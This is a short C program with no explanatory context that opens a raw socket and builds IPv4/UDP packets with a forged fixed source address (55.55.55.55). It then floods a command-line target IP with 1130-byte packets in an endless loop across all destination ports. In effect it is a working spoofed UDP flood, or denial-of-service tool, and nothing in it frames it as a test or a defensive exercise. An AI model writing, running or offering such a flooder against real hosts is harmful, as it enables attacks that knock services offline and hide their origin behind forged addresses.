#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <errno.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

 
#define SIZE 1130


unsigned short csum(unsigned short *buf, int nwords)
{
  unsigned long sum;

  for(sum=0; nwords>0; nwords--)
    sum += *buf++;

  sum  = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);

  return (unsigned short)(~sum);
}

int main(int argc, char *argv[])
{
  int reuse_addr, off, fd, i;
  
  unsigned char buf[SIZE];
  
  struct sockaddr_in dst;

  struct iphdr *ip;
  struct udphdr *udp;

  
  if (argc < 2){
    fprintf(stderr, "usage %s <DEST IP>\n", argv[0]);
    return -1;
  }
  
  memset(buf, 0, SIZE);

  ip = (struct iphdr*)buf;
  off = sizeof(struct iphdr);
  
  udp = (struct udphdr*)(buf + off);
  
  //dst.sin_port = htons(atoi(argv[2]));

  dst.sin_addr.s_addr = inet_addr(argv[1]);
  dst.sin_family = AF_UNSPEC;

  ip->ihl     = 5;
  ip->version = 4;
  ip->tos     = 16;
  ip->tot_len = SIZE;
  ip->id      = htons(54321);
  ip->ttl     = 64;
  ip->protocol= 17;
  ip->saddr   = inet_addr("55.55.55.55");
  ip->daddr   = dst.sin_addr.s_addr;


  udp->source = 0;//dst.sin_port;
  //udp->dest   = dst.sin_port;
  udp->len    = htons(SIZE - (off + sizeof(struct udphdr)));
  udp->check  = 0;

  //fd = socket(AF_PACKET, SOCK_RAW, IPPROTO_UDP);
  fd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
  if (fd < 0){
    fprintf(stderr,"%s: error socket (%s)\n", __func__, strerror(errno));
    return -1;
  }

  reuse_addr   = 1;
  if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &reuse_addr, sizeof(reuse_addr)) < 0){
    fprintf(stderr,"%s: error setsockopt 1: %s\n", __func__, strerror(errno));
    return -1;
  }

  reuse_addr   = 1;
  if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &reuse_addr, sizeof(reuse_addr)) < 0){
    fprintf(stderr,"%s: error setsockopt 2: %s\n", __func__, strerror(errno));
    return -1;
  }

#if 0
  if (bind(fd, rp->ai_addr, rp->ai_addrlen) < 0){
    fprintf(stderr,"%s: error bind on port: %s\n", __func__, argv[2]);
    freeaddrinfo(res);
    return -1;
  }
#endif
  
  i = 0;

  while (1){
    
    dst.sin_port = htons(i);
    udp->dest    = dst.sin_port;

    ip->check  = csum((unsigned short*)buf, sizeof(struct iphdr) + sizeof(struct udphdr));

    if (i > 65000)
      i = 0;
    else
      i++;

    if(sendto(fd, buf, SIZE, 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
      fprintf(stderr, "error sendto <%s>\n", strerror(errno));
      exit(-1);
    } else {
      //fprintf(stderr, "sent packet\n");
    }


  }

  fprintf(stderr, "done\n");

  return 0;
}

